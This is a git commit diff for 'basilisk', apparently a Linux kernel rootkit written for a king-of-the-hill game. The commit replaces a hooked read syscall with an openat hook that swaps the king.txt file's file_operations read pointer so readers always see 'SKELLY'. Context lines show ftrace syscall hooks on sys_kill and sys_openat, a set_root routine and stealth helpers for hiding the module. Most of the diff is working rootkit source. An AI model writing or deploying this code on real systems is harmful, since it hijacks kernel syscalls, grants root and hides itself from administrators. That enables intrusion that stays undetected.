fff79090700aef5acdd918cb937bf3e1c0d2efa7
skelly <skelly@arch.org>
2024-08-01 19:16:21 +0300

    Used fops manipulation instead of direct read syscall hooks

--- src/basilisk.c
+++ src/basilisk.c
@@ -19,7 +19,7 @@
 
 
 // Macros for protecting king.txt
-#define KING_FILENAME "/home/skelly/projects/basilisk/king.txt"
+#define KING_FILENAME "/home/vagrant/king.txt"
 #define KING_FILENAME_LEN strlen(KING_FILENAME)
 
 #define KING "SKELLY\n"
@@ -36,76 +36,21 @@ MODULE_VERSION("0.02");
 
 static short hidden = 0;
 
-static unsigned long king_inode_num = -1;
-static int king_file_read = 0;
-
-#ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage long (*orig_read)(const struct pt_regs *);
-
-static asmlinkage long hook_read(const struct pt_regs *regs)
+static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
 {
-    int fd = regs->di;
-    char __user *buf = (char *)regs->si;
-    size_t count = regs->dx;
-
-    struct file *file;
-    unsigned long f_inode_num;
-
-    file = fget(fd);
-    if (!file) {
-        return -EBADF; // Bad file descriptor
-    }
-    f_inode_num = file->f_inode->i_ino;
-    fput(file);
-
-    if (f_inode_num == king_inode_num && count >= KING_LEN) {
-        int read_len = king_file_read ? 0 : KING_LEN; // If file is not read, set read_len to KING_LEN otherwise, 0
-        if (read_len) { // Simulate a read call and return our king name
-            if (copy_to_user(buf, KING, read_len)) {
-                pr_alert("basilisk: copy_to_user failed\n");
-                return -EFAULT;
-            }
-            king_file_read ^= 1; // change flag
-            return read_len;
+    int read_len; 
+    if (*pos == 0 && count >= KING_LEN) { // Simulate a read call and return our king name
+        read_len = KING_LEN;
+	if (copy_to_user(buf, KING, read_len)) {
+	    pr_alert("basilisk: copy_to_user failed\n");
+	    return -EFAULT;
         }
-
-        king_file_read ^= 1;
-        return read_len; // Return EOF, read_len = 0; 
+	*pos += read_len; 
+        return read_len;
+    } else {
+	return 0; // Return EOF, read_len = 0; 
     }
-    return orig_read(regs);
 }
-#else
-static asmlinkage long (*orig_read)(int fd, char __user *buf, size_t count);
-
-static asmlinkage long hook_read(int fd, char __user *buf, size_t count)
-{
-    struct file *file;
-    unsigned long f_inode_num;
-
-    file = fget(fd);
-    if (!file) {
-        return -EBADF; // Bad file descriptor
-    }
-    f_inode_num = file->f_inode->i_ino;
-    fput(file);
-
-    if (f_inode_num == king_inode_num && count >= KING_LEN) {
-        int read_len = king_file_read ? 0 : KING_LEN; // If king file is not read, set read_len to KING_LEN otherwise, 0
-        if (read_len) { // Simulate a read call and return our king name
-            if (copy_to_user(buf, KING, read_len)) {
-                pr_alert("basilisk: copy_to_user failed\n");
-                return -EFAULT;
-            }
-            king_file_read = 1;
-            return read_len;
-        }
-        king_file_read = !king_file_read; // Update read state
-        return read_len; // Return EOF, read_len = 0; 
-    }
-    return orig_read(fd, buf, count);
-}
-
-#endif
 
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_openat)(const struct pt_regs *);
@@ -118,48 +63,88 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
     umode_t mode = regs->r10;
 
     struct file *file;
+    struct file_operations *new_f_ops;
     struct path path;
 
     char *resolved_path;
     long error;
 
     char kfilename[PATH_MAX];
+    char *full_path;
+    int fd;
+
     error = strncpy_from_user(kfilename, filename, PATH_MAX);
     if (error < 0) {
         pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
-        return error; 
+        return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
     }
 
     resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
     if (!resolved_path) {
-        return -ENOMEM;
+        pr_err("basilisk: kmalloc failed");
+	return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
     }
     error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
     if (error) {
+	pr_err("basilisk: failed to resolve path: error code %ld\n", error);
         kfree(resolved_path);
-        return error;
+        return orig_openat(dfd, filename, flags, mode);
     }
-    char *full_path = d_path(&path, resolved_path, PATH_MAX);
-    size_t full_path_size = strlen(full_path);
+    full_path = d_path(&path, resolved_path, PATH_MAX);
     if (IS_ERR(full_path)) {
-        path_put(&path);
+        pr_err("basilisk: d_path failed: %ld\n", PTR_ERR(full_path));
+	path_put(&path);
         kfree(resolved_path);
         return PTR_ERR(full_path);
     }
 
     if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) == 0) {
-        file = filp_open(kfilename, flags, mode);
-        if (IS_ERR(file)) {
+        pr_alert("basilisk: opening king file: %s\n", full_path);
+        // Get file descriptor 
+        fd = orig_openat(dfd, filename, flags, mode);
+        if (fd < 0) {
             pr_alert("basilisk: failed to open file: %s\n", kfilename);
-            return PTR_ERR(file);
+            path_put(&path);
+            kfree(resolved_path);
+            return fd; 
         }
-        king_inode_num = file->f_inode->i_ino;
-        fput(file); 
-    }
-    path_put(&path);
-    kfree(resolved_path);
+        if (fd == 0 || fd == 1 || fd == 2) { // make sure we are not messing with STDIN, STDOUT, STDERR
+            path_put(&path);
+            kfree(resolved_path);
+            return orig_openat(dfd, filename, flags, mode);
+        }
+        // Get associated file struct (fget)
+        file = fget(fd);
+        if (!file) {
+            pr_err("basilisk: failed to get file structure from file descriptor\n");
+            path_put(&path);
+            kfree(resolved_path);
+            return orig_openat(dfd, filename, flags, mode); 
+        }
 
-    return orig_openat(regs);
+
+        new_f_ops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
+        if (!new_f_ops) {
+            fput(file);
+	    path_put(&path);
+	    kfree(resolved_path);
+            pr_alert("Failed to allocate memory for new file_operations\n");
+            return orig_openat(dfd, filename, flags, mode);
+        }
+        new_f_ops->read = hook_read;
+        file->f_op = new_f_ops;
+        
+        fput(file);
+        path_put(&path);
+        kfree(resolved_path);
+
+        return fd;
+
+    } else {
+        path_put(&path);
+        kfree(resolved_path);
+        return orig_openat(dfd, filename, flags, mode);
+    }
 }
 #else
 static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
@@ -167,6 +152,7 @@ static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int 
 static asmlinkage long hook_openat(int dfd, const char __user *filename, int flags, umode_t mode)
 {
     struct file *file;
+    struct file_operations *new_f_ops;
     struct path path;
 
     char *resolved_path;
@@ -176,12 +162,13 @@ static asmlinkage long hook_openat(int dfd, const char __user *filename, int fla
     error = strncpy_from_user(kfilename, filename, PATH_MAX);
     if (error < 0) {
         pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
-        return error; 
+        return orig_openat(dfd, filename, flags, mode); 
     }
 
     resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
     if (!resolved_path) {
-        return -ENOMEM;
+
+        return orig_openat(dfd, filename, flags, mode);  
     }
     error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
     if (error) {
@@ -197,17 +184,49 @@ static asmlinkage long hook_openat(int dfd, const char __user *filename, int fla
 
     if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) == 0) {
         pr_alert("basilisk: opening king file: %s\n", full_path);
-        file = filp_open(kfilename, flags, mode);
-        if (IS_ERR(file)) {
+        // Get file descriptor 
+        int fd = orig_openat(dfd, filename, flags, mode);
+        if (fd < 0) {
             pr_alert("basilisk: failed to open file: %s\n", kfilename);
-            return PTR_ERR(file);
+            path_put(&path);
+            kfree(resolved_path);
+            return fd; 
         }
-        king_inode_num = file->f_inode->i_ino;
-        fput(file); 
+        if (fd == 0 || fd == 1 || fd == 2) { // make sure we are not messing with STDIN, STDOUT, STDERR
+            path_put(&path);
+            kfree(resolved_path);
+            return orig_openat(dfd, filename, flags, mode);
+        }
+        // Get associated file struct (fget)
+        file = fget(fd);
+        if (!file) {
+            pr_err("basilisk: failed to get file structure from file descriptor\n");
+            path_put(&path);
+            kfree(resolved_path);
+            return orig_openat(dfd, filename, flags, mode);
+        }
+
+
+        new_f_ops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
+        if (!new_f_ops) {
+            fput(file);
+            pr_alert("Failed to allocate memory for new file_operations\n");
+            return orig_openat(dfd, filename, flags, mode);
+        }
+        new_f_ops->read = hook_read;
+        file->f_op = new_f_ops;
+        
+        fput(file);
+        path_put(&path);
+        kfree(resolved_path);
+
+        return fd;
+
+    } else {
+        path_put(&path);
+        kfree(resolved_path);
+        return orig_openat(dfd, filename, flags, mode);
     }
-    path_put(&path);
-    kfree(resolved_path);
-    return orig_openat(dfd, filename, flags, mode);
 }
 #endif
 /* We now have to check for the PTREGS_SYSCALL_STUBS flag and
@@ -327,14 +346,15 @@ void set_root(void)
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("sys_openat", hook_openat, &orig_openat),
-    HOOK("sys_read", hook_read, &orig_read),
 };
 
 /* Module initialization function */
 static int __init basilisk_init(void)
 {
-   /* Hook the syscall and print to the kernel buffer */
     int err;
+    
+    init_this_kobj(); // initialize this_kobj utility struct in stealth_helper.h
+    /* Hook the syscall and print to the kernel buffer */
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
         return err;
